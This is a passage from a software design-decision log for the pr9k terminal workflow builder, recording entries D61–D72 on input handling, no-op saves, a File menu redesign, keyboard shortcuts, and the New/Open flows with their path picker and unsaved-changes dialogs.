- **Rationale:** Jr round 2 F80 flagged that D15 described the copy scope but said nothing about a default bundle that is itself broken (a stale config reference the shipped default never cleaned up). An always-copy approach would let the user discover the problem only after landing on the edit view with an immediate validation failure — confusing, because they asked for the default. Surfacing the problem at landing lets them decide whether to proceed or investigate.
- **Evidence:** Jr round 2 F80. D15 (copy scope).
- **Rejected alternatives:**
  - Refuse to copy when default is broken — strands users whose shipped default has a known issue.
  - Silent copy with latent fatal — poor discoverability.
- **Linked technical notes:** —
- **Driven by findings:** F80
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Copy-default-to-local

## D62: Numeric field non-numeric input behavior

- **Question:** When the user types a non-numeric character into a numeric field (e.g., a letter into `timeoutSeconds`), what happens?
- **Decision:** Non-numeric characters are silently ignored at input time. The field accepts only digits (and a leading `-` if the field permits negative values — none of the current schema's numeric fields do). No error is shown; the keystroke has no visible effect. Numeric fields also accept `Backspace` and cursor navigation keys normally. Paste with a non-numeric character in the middle is sanitized: digits before the first non-digit character are accepted, everything from the first non-digit onward is discarded, and the "pasted content sanitized" message (D42) fires.
- **Rationale:** Edge-case round 2 F81 flagged that D42 specifies paste-time sanitization but says nothing about typed non-numeric characters. Silent ignore is the least-surprising behavior for a numeric field — matches most GUI numeric-only inputs, avoids an error flood during normal typing, and does not swallow valid navigation keys.
- **Evidence:** Edge-case round 2 F81. D42 (input sanitization).
- **Rejected alternatives:**
  - Echo the character and show an error — creates an error flood on every stray keystroke.
  - Accept the character and reject at save time — user has no input-time feedback.
  - Reject with audible bell — most terminals do not have a bell, and those that do have it disabled.
- **Linked technical notes:** —
- **Driven by findings:** F81
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; Edge Cases table

## D63: No-op save behavior

- **Question:** What happens when the user invokes save and the in-memory state is identical to what is on disk (no changes since load or since last save)?
- **Decision:** The builder detects no-change state by comparing the in-memory serialization against the on-disk configuration file bytes (both already parsed). If they are identical, save is a **no-op**: the file is not rewritten, validation does not run, no temp file is created, the D41 mtime snapshot is not refreshed (there's no new write to snapshot against), and the success-state feedback per D53 shows `No changes to save` in place of `Saved at HH:MM:SS`.
- **Rationale:** Edge-case round 2 F82 flagged that an always-rewrite save would change the file mtime on every save invocation, producing spurious conflict dialogs for concurrent observers (other builder sessions, tools watching the file). A true no-op preserves the file's last-written-by-intent mtime and avoids unnecessary disk I/O. Running validation on unchanged state would also be wasted work — the state already passed validation when it was last saved.
- **Evidence:** Edge-case round 2 F82. D41 (mtime snapshot).
- **Rejected alternatives:**
  - Always rewrite — changes mtime spuriously.
  - Disable the save affordance when unchanged — hides the user's ability to confirm they meant the current state.
- **Linked technical notes:** —
- **Driven by findings:** F82
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9; Edge Cases table

## D64: Menu-bar target-selection model

- **Question:** How does the user choose which workflow to edit?
- **Decision:** The builder shows a persistent menu bar at the top of the screen with a `File` menu containing `New`, `Open`, `Save`, and `Quit`. The four original landing-page target-selection options (edit default in place, copy-default-to-local, edit project-local, edit arbitrary path) are superseded by this model. File > New handles both "start from a copy of the default" and "start with an empty scaffold"; File > Open handles opening any existing `config.json` at an arbitrary path; File > Save and File > Quit route through the existing save (D6, D7, T1) and unsaved-changes (D54) flows.
- **Rationale:** User input in R2 review. The landing page was a one-shot modal that disappeared after the user made a choice — but "switch to a different workflow" and "save what you are editing" are mid-session operations, not startup-only operations. A persistent menu bar makes those actions always reachable. The File menu idiom (New/Open/Save/Quit) is familiar from decades of GUI editor convention; users need no instruction manual to know what each item does. Replaces and subsumes D2 (target selection modes), D31 (duplicate suppression), D50 (landing-page option subtitles), and D8 (scaffold-or-copy-or-cancel as a standalone dialog).
- **Evidence:** User input on the menu-bar redesign in R2. UX designer round-2 review (F84-F92).
- **Rejected alternatives:**
  - Keep the landing page — user explicitly redesigned it away.
  - A single "File > Browse" item that launches a tree picker — adds mechanism without reducing friction.
  - Auto-load the resolved default every time — silent decision; see D68 rationale.
- **Linked technical notes:** —
- **Driven by findings:** F83
- **Dependent decisions:** D65, D66, D67, D68, D69, D70, D71, D72
- **Referenced in spec:** Primary Flow steps 1-4; User Interactions — Affordances (menu bar)

## D65: Menu bar rendering and placement

- **Question:** Where does the menu bar live relative to the rest of the chrome?
- **Decision:** The menu bar occupies its own dedicated row at the top of the screen, separated from the session header by a single horizontal rule. Top-to-bottom layout: menu bar row (row 1), separator (row 2), session header (row 3), separator (row 4), outline + detail pane (rows 5..N-1), shortcut footer (row N). The menu bar is left-aligned; `File` is the only item in v1, with room reserved for future menus (Edit, Help, etc.) without a layout redesign. The session header content (target path, unsaved-changes indicator, banners, findings summary) stays on row 3 — nothing from the session header moves into the menu bar row.
- **Rationale:** Two rows of permanent chrome (menu bar + separator) is a small cost, paid once, in exchange for removing an entire landing-page screen from the user flow. Separating the menu bar from the session header keeps two distinct cognitive surfaces distinct: "what file operations are available" (menu bar) vs. "what am I currently editing and what's its state" (session header). Merging them would conflate both concerns and break the 80-column budget on long paths.
- **Evidence:** UX designer round-2 recommendation. Existing TUI layout conventions at `src/internal/ui/model.go`.
- **Rejected alternatives:**
  - Menu bar embedded in session header — conflates two concerns on one row.
  - Menu bar hidden until activated — loses persistent discoverability of File operations.
- **Linked technical notes:** —
- **Driven by findings:** F84
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances

## D66: Menu activation model

- **Question:** How does the user open the File menu?
- **Decision:** Three entry points, all always available: (a) press `F10`; (b) press `Alt+F`; (c) mouse-click on the `File` label in the menu bar. When a text field is focused, `F10` opens the menu unconditionally, stealing focus from the field (the field's partial input is preserved in memory — nothing is committed or cleared by menu activation). `Alt+F` has the same behavior but is known-fragile under tmux's default `escape-time`, so `F10` is the canonical keyboard path and `Alt+F` is a convenience alias for environments where it works reliably. Mouse click routes to the menu regardless of keyboard focus. Closing the menu via Escape or item-selection restores focus to whatever was focused before the menu opened (same pattern as D55).
- **Rationale:** `F10` is the universally documented "activate menu bar" key in POSIX terminal conventions and ncurses-era programs. It is a function key — no modifier, no printable-character conflict, unused by any text-input operation. `Alt+F` matches the Windows/Linux GUI convention for "open the File menu" and is familiar to users coming from GUI editors. Triple coverage (F10, Alt+F, mouse) satisfies both keyboard-fluent and mouse-fluent users, plus the tmux-fragile fallback path mirrors D34's approach for the reorder shortcut.
- **Evidence:** UX designer round-2 recommendation. F10 precedent across ncurses apps. D34 (Alt-fragility already documented).
- **Rejected alternatives:**
  - F10 only — loses the Alt+F convenience for GUI-habit users.
  - Alt+F only — silently fails under tmux.
  - A single-character shortcut like `m` — conflicts with text-input fields.
- **Linked technical notes:** —
- **Driven by findings:** F85
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow — menu activation; User Interactions — Affordances

## D67: Menu item keyboard shortcuts

- **Question:** What keyboard shortcuts activate each File menu item?
- **Decision:** `Ctrl+N` for New, `Ctrl+O` for Open, `Ctrl+S` for Save, `Ctrl+Q` for Quit. These shortcuts are intercepted at the application level before they reach any focused text field — the user cannot type these byte sequences into a text field by pressing them, which is consistent with every terminal editor that uses Ctrl-combinations as global shortcuts. `Ctrl+S` has a well-known collision with terminal XON/XOFF flow control (Ctrl+S sends XOFF, freezing output on terminals where flow control is enabled): the spec documents this and the how-to guide names the mitigation (`stty -ixon` in the user's shell profile, or using File > Save via the menu bar). The shortcut labels appear to the right of their menu items in the dropdown so users learn them passively.
- **Rationale:** Ctrl+N/O/S/Q is the standard cross-platform shortcut vocabulary for File-menu operations. Using the standard saves users from relearning a new vocabulary. The XON/XOFF caveat is real but has a standard mitigation; explicitly documenting it is honest and preempts user confusion when the shortcut appears to do nothing.
- **Evidence:** UX designer round-2 recommendation. XON/XOFF semantics (`stty -ixon` man page). Documentation standard `docs/coding-standards/documentation.md`.
- **Rejected alternatives:**
  - Avoid Ctrl+S to sidestep XON/XOFF — abandons decades of convention; users would be hunting for the save shortcut.
  - Use single-character shortcuts (n/o/s/q) — collides with text-input fields.
  - Use F-key shortcuts (F2=save, etc.) — no mnemonic link to the operation.
- **Linked technical notes:** —
- **Driven by findings:** F86
- **Dependent decisions:** D38
- **Referenced in spec:** Primary Flow — menu item shortcuts; Documentation Obligations (stty -ixon how-to note)

## D68: Initial-launch state

- **Question:** What does the builder show on first frame when the user runs `pr9k workflow`?
- **Decision:** **Empty-editor state** with the menu bar visible and a centered hint panel in the detail-pane area: "`File > New` to create a workflow (`Ctrl+N`)" and "`File > Open` to open an existing config.json (`Ctrl+O`)." The outline panel shows the text `No workflow open`. No file is auto-loaded unless the user explicitly passed `--workflow-dir` on the command line — in that case, the builder loads the specified file via the same code path as File > Open (applying all load-time behaviors: read-only check, symlink banner, external-workflow banner, unknown-field warning, parse-error recovery).
- **Rationale:** Under the menu-bar model (D64), the builder no longer gates entry to the edit view on a landing-page choice — it opens directly to the edit view. But the edit view has no meaningful content until a file is loaded. Auto-loading whatever `resolveWorkflowDir` returns would silently decide what the user is editing, which can lead to the user inadvertently saving changes to the system-shipped default bundle. The empty-editor-with-hint approach makes the user's first action explicit: they see two paths (New, Open) and pick one. `--workflow-dir` is treated as the explicit expression of intent ("open this file for me") and honored as an auto-open; absent that flag, nothing is loaded.
- **Evidence:** UX designer round-2 recommendation. Nielsen heuristic 3 (user control and freedom). VS Code / Neovim no-file-argument convention.
- **Rejected alternatives:**
  - Auto-load D3-resolved default — silently decides what the user edits; an accidental Ctrl+S can mutate the shipped default.
  - Show a blank edit view with no hint — leaves first-time users without a starting action.
  - Modal "What do you want to do?" dialog at startup — a landing page by a different name.
- **Linked technical notes:** —
- **Driven by findings:** F87
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow steps 1-2; User Interactions — Empty-state

## D69: File > New flow

- **Question:** What is the complete flow when the user invokes File > New?
- **Decision:** Five-step flow: (1) **Unsaved-changes check** — if the current session has unsaved changes, the D54 three-way dialog intercepts (Save/Cancel/Discard with Cancel default and Discard two-step confirmation). Cancel returns to the current session unchanged. Save-success or confirmed-Discard continues the New flow. Save with fatal findings cancels the New flow and opens the findings panel (same as D40 handling). (2) **Choice dialog** — three-option dialog: "Copy from default workflow" / "Start with empty workflow" / "Cancel" (Cancel is keyboard default per D48). The choice comes before the path picker because the user's intent (full bundle vs. empty scaffold) must be known to present meaningful defaults. (3) **Pre-copy integrity check** (only when "Copy from default workflow" is chosen) — per D61, the builder validates the default bundle's internal reference integrity; if broken, Copy-anyway / Cancel dialog. (4) **Path picker** — a single-text-input dialog (D71) pre-filled with `<projectDir>/.pr9k/workflow/` as the destination path. If the chosen path already contains a `config.json`, an inline warning is shown; the user may continue (the save uses T1 atomic rename so there is no partial-write risk) or pick a different path. (5) **Load into edit view** — the new in-memory workflow (either a copy of the default's in-memory state or the empty scaffold) is loaded; nothing is written to disk until the first File > Save. All load-time behaviors (D4, D17, D22, D30) apply to the chosen destination path.
- **Rationale:** UX designer round-2 recommendation. Choice-before-path matches the user's mental model of the task. Putting the unsaved-changes interception first is necessary to preserve the D54 safety guarantee; putting the pre-copy integrity check after the choice but before the path picker catches a broken default bundle before the user commits to a location. The "nothing is written until first Save" contract preserves T1's atomicity guarantee end-to-end.
- **Evidence:** UX designer round-2 recommendation.
- **Rejected alternatives:**
  - Path picker first, then choice — user cannot evaluate the path without knowing the intent.
  - Copy/scaffold to disk immediately — breaks the "first save is explicit" contract from D7.
  - Skip the unsaved-changes check — silently destroys current session edits.
- **Linked technical notes:** —
- **Driven by findings:** F88
- **Dependent decisions:** D61, D71, D72
- **Referenced in spec:** Primary Flow — File > New; Alternate Flows — File > New

## D70: File > Open flow

- **Question:** What is the complete flow when the user invokes File > Open?
- **Decision:** Three-step flow: (1) **Unsaved-changes check** — same D54 interception as File > New. (2) **Path picker** — a single-text-input dialog (D71) pre-filled with `<projectDir>/.pr9k/workflow/config.json` as the target file. The picker targets a file (not a directory); tab-completion resolves against the filesystem. If the typed path is a directory, the picker shows an inline note "That is a directory — add `/config.json` to open the workflow file." If the path does not exist, the picker shows an inline note "No config.json at that path — use File > New to create one." (3) **Load into edit view** — the chosen file is loaded via the same load path as `--workflow-dir` auto-open; all load-time behaviors (D4 read-only detection, D17 symlink banner, D22 external-workflow banner, D18 unknown-field banner, D43 load-time integrity checks, D36 parse-error recovery) apply unchanged. If parsing fails, the parse-error recovery view (D36) replaces the edit view; the recovery-view actions and auto-reload after external-editor fix are unchanged.
- **Rationale:** UX designer round-2 recommendation. Open is the simpler of the two flows — user picks a file, builder loads it. All existing load-time handling is preserved so the behavior after-load is identical regardless of whether the file was chosen via --workflow-dir or File > Open.
- **Evidence:** UX designer round-2 recommendation.
- **Rejected alternatives:**
  - No pre-fill — user must type every path from scratch.
  - Default to `~` instead of the project's .pr9k/workflow/ — misses the most common case.
  - Separate flows for "open local" vs "open external" — unnecessary complexity; the single picker handles both.
- **Linked technical notes:** —
- **Driven by findings:** F89
- **Dependent decisions:** D71, D72
- **Referenced in spec:** Primary Flow — File > Open; Alternate Flows — File > Open

## D71: Path picker design

- **Question:** How does the path picker present itself to the user?
- **Decision:** A single labeled text input with filesystem tab-completion. The dialog shows a title (e.g., "Open workflow file" or "Where should the new workflow be saved?"), a pre-filled editable path input, a hint line ("tab to complete"), and two buttons (e.g., "Open" or "Create", and "Cancel"). Cancel is keyboard default per D48. The text input behaves like a shell path input: typing normally edits the path; `Tab` completes against the filesystem — exactly-one-match auto-completes, multiple-matches cycle through matches on repeated presses. The dialog re-layouts on terminal resize (D48). The picker does not embed a tree widget in v1.
- **Rationale:** UX designer round-2 recommendation. The pr9k TUI stack has no existing file-picker widget, and the target persona (workflow author) is shell-fluent, so tab-completion is a familiar and fast input model. An embedded tree picker would cost implementation effort and screen rows without changing what the user can accomplish; a single input extends cleanly later if needed. The pre-filled default lets the user accept the common case by pressing Enter.
- **Evidence:** UX designer round-2 recommendation. D38 (target persona "workflow author" is shell-proficient).
- **Rejected alternatives:**
  - Embedded tree file browser — overbuilt for v1.
  - Free-text with no completion — tedious for deep paths.
  - Two-step picker (choose directory, then file) — extra friction.
- **Linked technical notes:** —
- **Driven by findings:** F90
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — File > New, File > Open; User Interactions — Affordances

## D72: Unsaved-changes interception and resume semantics for File > New / File > Open

- **Question:** What happens when the user invokes File > New or File > Open while the current session has unsaved changes?
- **Decision:** Both File > New and File > Open invoke the same D54 three-way unsaved-changes dialog (Save / Cancel / Discard with Cancel default and two-step Discard confirmation). **Resume semantics:** if the user picks Save and the save succeeds, the New / Open flow resumes automatically — the user does not need to re-invoke the menu item. If the user picks Save and the save surfaces fatal findings, the New / Open flow is cancelled, the findings panel opens, the user stays in the current session's edit view to resolve the fatals (same as D40's quit-with-fatals handling). If the user picks Discard (and confirms the two-step), the New / Open flow resumes automatically with the current in-memory state discarded. If the user picks Cancel (or presses Escape), the New / Open invocation is cancelled entirely — the user returns to the current session's edit view unchanged.
- **Rationale:** UX designer round-2 recommendation. The user has a goal (switch workflows); the builder intercepts for a legitimate reason (save protection); the builder should carry the user through to the goal after they resolve the interception, not force them to re-invoke the menu item. Nielsen heuristic 3 (user control and freedom). The D40 fatal-findings branch is preserved verbatim: a save with fatals cancels the pending action and opens the findings panel.
- **Evidence:** UX designer round-2 recommendation. D40 (fatals cancel pending actions). D54 (existing unsaved-changes dialog).
- **Rejected alternatives:**
  - Require user to re-invoke File > New / File > Open after Save or Discard — needless friction.
  - Skip the D54 two-step Discard confirmation for the New / Open path — inconsistent with Quit, creates data-loss risk asymmetry.
  - Auto-save on File > New / File > Open — silently saves possibly-unwanted state.
- **Linked technical notes:** —
- **Driven by findings:** F91
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow — File > New, File > Open; Alternate Flows — Unsaved-changes interception
